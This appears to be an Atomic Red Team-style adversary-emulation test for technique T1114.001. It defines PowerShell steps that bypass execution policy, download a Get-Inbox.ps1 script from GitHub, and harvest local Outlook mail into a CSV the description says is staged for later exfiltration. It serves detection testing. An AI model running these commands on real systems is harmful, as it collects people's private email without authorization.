{
  "id": "3f1b5096-0139-4736-9b78-19bcb02bb1cb",
  "name": "Email Collection with PowerShell Get-Inbox",
  "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\nSuccessful execution will produce stdout message stating \"Please be patient, this may take some time...\". Upon completion, final output will be a mail.csv file.\n\nNote: Outlook is required, but no email account necessary to produce artifacts.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "0edaa243-db74-4078-b329-d1e85a692a2d",
      "type": "execute-command",
      "data": {
        "command": "powershell -executionpolicy bypass -command \"#{file_path}\\Get-Inbox.ps1\" -file #{output_file}\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "97e79055-1b67-45b5-8b63-e20f6d418e20",
      "type": "execute-command",
      "data": {
        "command": "Remove-Item #{output_file} -Force -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "2d14fe99-02e7-4b93-8d2a-f14cbcb770d9",
      "name": "Check dependency 1/1",
      "description": "Get-Inbox.ps1 must be located at #{file_path}\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{file_path}\\Get-Inbox.ps1\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "5075bea6-a03f-4cdf-b141-1eaa90e56a8c",
      "name": "Resolve dependency 1/1",
      "description": "Get-Inbox.ps1 must be located at #{file_path}\n",
      "type": "execute-command",
      "data": {
        "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114.001/src/Get-Inbox.ps1\" -OutFile \"#{file_path}\\Get-Inbox.ps1\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "33019f63-d657-4ede-ba66-b6745eac7581",
      "name": "Re-check dependency 1/1",
      "description": "Get-Inbox.ps1 must be located at #{file_path}\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{file_path}\\Get-Inbox.ps1\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "0edaa243-db74-4078-b329-d1e85a692a2d",
      "p": "on-success",
      "o": "97e79055-1b67-45b5-8b63-e20f6d418e20"
    },
    {
      "s": "0edaa243-db74-4078-b329-d1e85a692a2d",
      "p": "on-failure",
      "o": "97e79055-1b67-45b5-8b63-e20f6d418e20"
    },
    {
      "s": "2d14fe99-02e7-4b93-8d2a-f14cbcb770d9",
      "p": "on-success",
      "o": "0edaa243-db74-4078-b329-d1e85a692a2d"
    },
    {
      "s": "2d14fe99-02e7-4b93-8d2a-f14cbcb770d9",
      "p": "on-failure",
      "o": "5075bea6-a03f-4cdf-b141-1eaa90e56a8c"
    },
    {
      "s": "5075bea6-a03f-4cdf-b141-1eaa90e56a8c",
      "p": "on-success",
      "o": "33019f63-d657-4ede-ba66-b6745eac7581"
    },
    {
      "s": "33019f63-d657-4ede-ba66-b6745eac7581",
      "p": "on-failure",
      "o": "0edaa243-db74-4078-b329-d1e85a692a2d"
    }
  ],
  "tags": [
    "T1114.001",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "output_file",
      "type": "string",
      "description": "Output file path",
      "value": "$env:TEMP\\mail.csv"
    },
    {
      "name": "file_path",
      "type": "string",
      "description": "File path for Get-Inbox.ps1",
      "value": "PathToAtomicsFolder\\T1114.001\\src"
    }
  ]
}